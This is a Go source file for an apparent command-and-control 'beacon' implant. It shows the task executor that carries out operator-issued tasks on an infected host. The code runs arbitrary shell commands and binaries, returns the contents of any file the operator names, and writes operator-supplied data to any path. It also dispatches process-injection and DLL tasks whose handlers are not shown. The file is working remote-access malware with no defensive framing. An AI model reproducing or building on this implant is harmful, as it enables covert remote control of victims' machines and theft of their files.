package beacon

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"

	"darkarts/pkg/tasking"
)

type Executor struct {
	Log     *slog.Logger
	Timeout time.Duration
}

func (e *Executor) Run(ctx context.Context, t *tasking.Task) *tasking.Result {
	if e.Timeout <= 0 {
		e.Timeout = 30 * time.Second
	}
	runCtx, cancel := context.WithTimeout(ctx, e.Timeout)
	defer cancel()

	res := &tasking.Result{
		TaskID:      t.ID,
		SessionID:   t.SessionID,
		CompletedAt: time.Now().UTC(),
	}
	defer func() {
		if r := recover(); r != nil {
			res.Error = fmt.Sprintf("beacon: task panic: %v", r)
			e.Log.Warn("task panic recovered", "task", t.ID, "panic", r)
		}
	}()
	switch t.Type {
	case "shell":
		e.runShell(runCtx, t.Payload, res)
	case "exec":
		e.runExec(runCtx, t.Payload, res)
	case "sleep":
		e.runSleep(t.Payload, res)
	case "download":
		e.runDownload(t.Payload, res)
	case "upload":
		e.runUpload(t.Payload, res)
	case "kill":
		res.Output = []byte("kill")
	case "inject":
		e.runInject(t.Payload, res)
	case "dll":
		e.runDll(t.Payload, res)
	default:
		res.Error = "beacon: unknown task type " + t.Type
	}
	return res
}

func (e *Executor) runShell(ctx context.Context, payload []byte, res *tasking.Result) {
	var p struct {
		Cmd string `json:"cmd"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/C", p.Cmd)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", p.Cmd)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		res.Error = err.Error()
	}
	res.Output = out
}

func (e *Executor) runExec(ctx context.Context, payload []byte, res *tasking.Result) {
	var p struct {
		Path string `json:"path"`
		Args string `json:"args"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Path == "" {
		res.Error = "beacon: exec requires path"
		return
	}
	cmd := exec.CommandContext(ctx, p.Path)
	if p.Args != "" {
		cmd.Args = append(cmd.Args, strings.Fields(p.Args)...)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		res.Error = err.Error()
	}
	res.Output = out
}

func (e *Executor) runSleep(payload []byte, res *tasking.Result) {
	var p struct {
		Seconds int `json:"seconds"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = []byte(`{"seconds":` + strconv.Itoa(p.Seconds) + `}`)
}

func (e *Executor) runDownload(payload []byte, res *tasking.Result) {
	var p struct {
		Src string `json:"src"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Src == "" {
		res.Error = "beacon: download requires src"
		return
	}
	b, err := os.ReadFile(p.Src)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = b
}

func (e *Executor) runUpload(payload []byte, res *tasking.Result) {
	var p struct {
		Dst  string `json:"dst"`
		Data string `json:"data"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Dst == "" || p.Data == "" {
		res.Error = "beacon: upload requires dst and base64 data"
		return
	}
	data, err := base64.StdEncoding.DecodeString(p.Data)
	if err != nil {
		res.Error = err.Error()
		return
	}
	if err := os.WriteFile(p.Dst, data, 0o600); err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = []byte("uploaded " + strconv.Itoa(len(data)) + " bytes")
}
